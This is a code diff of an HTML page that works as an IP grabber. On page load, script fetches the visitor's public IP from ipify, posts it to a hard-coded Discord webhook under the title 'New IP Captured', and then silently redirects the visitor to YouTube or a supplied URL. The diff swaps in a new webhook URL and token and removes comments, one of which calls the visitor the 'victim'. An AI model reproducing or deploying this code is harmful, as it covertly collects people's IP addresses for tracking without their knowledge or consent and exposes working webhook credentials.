@@ -2,18 +2,15 @@
 <html>
 <head>
     <script>
-        // Get redirect URL from query parameter
         const params = new URLSearchParams(window.location.search);
         const redirectUrl = params.get('redirect') || 'https://www.youtube.com';
 
-        // Grab IP and send to Discord
         fetch('https://api.ipify.org?format=json')
             .then(res => res.json())
             .then(data => {
                 const ip = data.ip;
-                const webhook = 'https://discord.com/api/webhooks/1523453667607449690/kBVgPK3AMY7AVO82kdk3D3lDHmrIxZRCorXZPnvDjXtCAsNKhaT2N9ew_YTAcBozGj0I';
+                const webhook = 'https://discord.com/api/webhooks/1526391820873891932/BjN36ir1LpF2B4iv_EOWwksNTFdFrsByC52nL9o_An44nBIRMAQaXlR_roTRdobF-Har';
                 
-                // Nice embed
                 const embed = {
                     title: '🎯 New IP Captured',
                     color: 0xe94560,
@@ -32,12 +29,10 @@
                     body: JSON.stringify({ embeds: [embed] })
                 })
                 .finally(() => {
-                    // Redirect victim to the intended site
                     window.location.href = redirectUrl;
                 });
             })
             .catch(() => {
-                // Fallback redirect if IP fetch fails
                 window.location.href = redirectUrl;
             });
     </script>
